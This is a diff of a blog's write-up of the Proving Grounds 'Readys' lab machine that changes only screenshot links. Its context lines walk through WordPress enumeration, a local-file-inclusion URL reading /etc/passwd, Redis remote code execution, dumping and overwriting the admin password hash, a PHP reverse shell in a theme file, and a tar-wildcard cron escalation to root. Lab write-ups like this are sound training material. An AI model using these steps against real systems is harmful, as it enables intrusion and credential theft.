@@ -9,7 +9,7 @@ In this entry I will solve PG's Readys machine. It is an Linux machine in the [T
 
 `nmap -sC -sV -p22,80,6379 192.168.223.166 -Pn -o targeted.txt`
 
-![c5391e4051b28caa4a2edecf56afeb50.png](https://github.com/v3l4r10/v3l4r10.github.io/blob/master/screenshots/Readys/c5391e4051b28caa4a2edecf56afeb50.png?raw=true234)
+![c5391e4051b28caa4a2edecf56afeb50.png](/assets/img/screenshots/Readys/c5391e4051b28caa4a2edecf56afeb50.png234)
 
 By visiting http[:]//192.168.223.166/ I find wordpress running so I run wpscan.
 
@@ -17,7 +17,7 @@ By visiting http[:]//192.168.223.166/ I find wordpress running so I run wpscan.
 
 `wpscan -e --url http[:]//192.168.223.166/`
 
-![6b16ef438cdc9c202a84aab24c57591c.png](https://github.com/v3l4r10/v3l4r10.github.io/blob/master/screenshots/Readys/6b16ef438cdc9c202a84aab24c57591c.png?raw=true)
+![6b16ef438cdc9c202a84aab24c57591c.png](/assets/img/screenshots/Readys/6b16ef438cdc9c202a84aab24c57591c.png)
 
 The website discloses the admin user. I try to bruteforce the user runing wpscan
 
@@ -29,19 +29,19 @@ While the attack is running I check redis, I try to connect and get some info bu
 
 `redis-cli -h 192.168.223.166`
 
-![eae720747869812f3e7085d2ea0789d1.png](https://github.com/v3l4r10/v3l4r10.github.io/blob/master/screenshots/Readys/eae720747869812f3e7085d2ea0789d1.png?raw=true)
+![eae720747869812f3e7085d2ea0789d1.png](/assets/img/screenshots/Readys/eae720747869812f3e7085d2ea0789d1.png)
 
 ## Back to WP
 
 Going back to the WordPress site, inspecting the source code I find SiteEditor plugin.
 
-![6076885f10b4dcfbd3a4a4fa8223dc2f.png](https://github.com/v3l4r10/v3l4r10.github.io/blob/master/screenshots/Readys/6076885f10b4dcfbd3a4a4fa8223dc2f.png?raw=true)
+![6076885f10b4dcfbd3a4a4fa8223dc2f.png](/assets/img/screenshots/Readys/6076885f10b4dcfbd3a4a4fa8223dc2f.png)
 
 I google for any exploit and I find a possible LFI https://www.exploit-db.com/exploits/44340
 
 `[http[:]//192.168.223.166/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax\_shortcode\_pattern.php?ajax_path=/etc/passwd](http[:]//192.168.223.166/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax%5C_shortcode%5C_pattern.php?ajax_path=/etc/passwd)`
 
-![768b40cdbb003c2ea7b4e4fdace55e0e.png](https://github.com/v3l4r10/v3l4r10.github.io/blob/master/screenshots/Readys/768b40cdbb003c2ea7b4e4fdace55e0e.png?raw=true)
+![768b40cdbb003c2ea7b4e4fdace55e0e.png](/assets/img/screenshots/Readys/768b40cdbb003c2ea7b4e4fdace55e0e.png)
 
 ## Back to redis
 
@@ -52,21 +52,21 @@ As redis is running, I try to read redis configuration file, under /etc/redis ht
 
 I find a possible username for Redis service
 
-![d744357582946f7c99ae541cf13d1163.png](https://github.com/v3l4r10/v3l4r10.github.io/blob/master/screenshots/Readys/d744357582946f7c99ae541cf13d1163.png?raw=true)
+![d744357582946f7c99ae541cf13d1163.png](/assets/img/screenshots/Readys/d744357582946f7c99ae541cf13d1163.png)
 
 By typing `AUTH Ready4Redis?` I  get the Redis version: 5.0.14.
 
-![532c82325e1499468947b4b2d704e4bd.png](https://github.com/v3l4r10/v3l4r10.github.io/blob/master/screenshots/Readys/532c82325e1499468947b4b2d704e4bd.png?raw=true)
+![532c82325e1499468947b4b2d704e4bd.png](/assets/img/screenshots/Readys/532c82325e1499468947b4b2d704e4bd.png)
 
 # Getting a shell
 
 After googling for the version  I came out that this version is vulnerable to RCE . In this case I use the following [exploit](https://github.com/n0b0dyCN/redis-rogue-server). If fails try again :)
 
-![7c570a5c9b43f3201629238e63a2bbf6.png](https://github.com/v3l4r10/v3l4r10.github.io/blob/master/screenshots/Readys/7c570a5c9b43f3201629238e63a2bbf6.png?raw=true)
+![7c570a5c9b43f3201629238e63a2bbf6.png](/assets/img/screenshots/Readys/7c570a5c9b43f3201629238e63a2bbf6.png)
 
 I get a TTY through `python3 -c "import pty; pty.spawn('/bin/bash')".` After that I search for the mysql database credentials in `/var/www/html/wp-config.php`
 
-![63258e92a72d7fe42dd95cb11f310676.png](https://github.com/v3l4r10/v3l4r10.github.io/blob/master/screenshots/Readys/63258e92a72d7fe42dd95cb11f310676.png?raw=true)
+![63258e92a72d7fe42dd95cb11f310676.png](/assets/img/screenshots/Readys/63258e92a72d7fe42dd95cb11f310676.png)
 
 # MySQL
 
@@ -80,16 +80,16 @@ I connect to mysql and then I dump admin's credentials:
 
 `select * from wp_users;`
 
-![569b714daa20fc604f40c8e724b95821.png](https://github.com/v3l4r10/v3l4r10.github.io/blob/master/screenshots/Readys/569b714daa20fc604f40c8e724b95821.png?raw=true)
+![569b714daa20fc604f40c8e724b95821.png](/assets/img/screenshots/Readys/569b714daa20fc604f40c8e724b95821.png)
 I try to crack the hash but I do not get any result, so I update admin's password in mysql databse, for that I use [wodpress hash generator](https://www.useotools.com/wordpress-password-hash-generator/.) tool
 
-![bf64b842a1784c3b54a9d96863a1e8a9.png](https://github.com/v3l4r10/v3l4r10.github.io/blob/master/screenshots/Readys/bf64b842a1784c3b54a9d96863a1e8a9.png?raw=true)
+![bf64b842a1784c3b54a9d96863a1e8a9.png](/assets/img/screenshots/Readys/bf64b842a1784c3b54a9d96863a1e8a9.png)
 
 By typing the desired password, the tool creates the mysql command to update the user's password. **Remember to rename your_user_name by 'admin' and add ";" **
 
 ``UPDATE `wp_users` SET `user_pass` = '``$P$`BxLKwoTitAjOYxf8iHcDrx0Z3ksN8v/' WHERE user_login = 'admin';`
 
-![8228a5ec0cb9527c65914d3086843920.png](https://github.com/v3l4r10/v3l4r10.github.io/blob/master/screenshots/Readys/8228a5ec0cb9527c65914d3086843920.png?raw=true)
+![8228a5ec0cb9527c65914d3086843920.png](/assets/img/screenshots/Readys/8228a5ec0cb9527c65914d3086843920.png)
 
 # WordPress Exploitation
 
@@ -97,7 +97,7 @@ After that I log in to the WordPress admin portal, with admin:admin
 
 Go to Appearance -->Theme editor. (I am using twentytwenty template)
 
-![4748cfa6680b70d337cf2ec9c3839b69.png](https://github.com/v3l4r10/v3l4r10.github.io/blob/master/screenshots/Readys/4748cfa6680b70d337cf2ec9c3839b69.png?raw=true)
+![4748cfa6680b70d337cf2ec9c3839b69.png](/assets/img/screenshots/Readys/4748cfa6680b70d337cf2ec9c3839b69.png)
 
 Edit 404.php file and copy [pentestmonkey's reverse shell](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php) or generate one with msfvenom:
 
@@ -109,11 +109,11 @@ Then trigger the exploit by visiting `[http[:]//192.168.223.166/wp-content/theme
 
 After getting the shell I check crontab and a backup.sh file is running.
 
-![6d43ef534744f360c62594fb2eb4963b.png](https://github.com/v3l4r10/v3l4r10.github.io/blob/master/screenshots/Readys/6d43ef534744f360c62594fb2eb4963b.png?raw=true)
+![6d43ef534744f360c62594fb2eb4963b.png](/assets/img/screenshots/Readys/6d43ef534744f360c62594fb2eb4963b.png)
 
 Reading the backup file is seems that the script uses "tar" command
 
-![f38f9eb8b8230c5bc6e76be24955b121.png](https://github.com/v3l4r10/v3l4r10.github.io/blob/master/screenshots/Readys/f38f9eb8b8230c5bc6e76be24955b121.png?raw=true)
+![f38f9eb8b8230c5bc6e76be24955b121.png](/assets/img/screenshots/Readys/f38f9eb8b8230c5bc6e76be24955b121.png)
 
 ### Wildcard for Privilege Escalation
 
@@ -133,6 +133,6 @@ Finally, a netcat listener is created on the Kali machine on port 4445. Since th
 
 Wait to the crontab and get the shell as root
 
-![ef8bce19d64b5cc79ead44d0d007ed59.png](https://github.com/v3l4r10/v3l4r10.github.io/blob/master/screenshots/Readys/ef8bce19d64b5cc79ead44d0d007ed59.png?raw=true)
+![ef8bce19d64b5cc79ead44d0d007ed59.png](/assets/img/screenshots/Readys/ef8bce19d64b5cc79ead44d0d007ed59.png)
 
 Pwn3d! :D
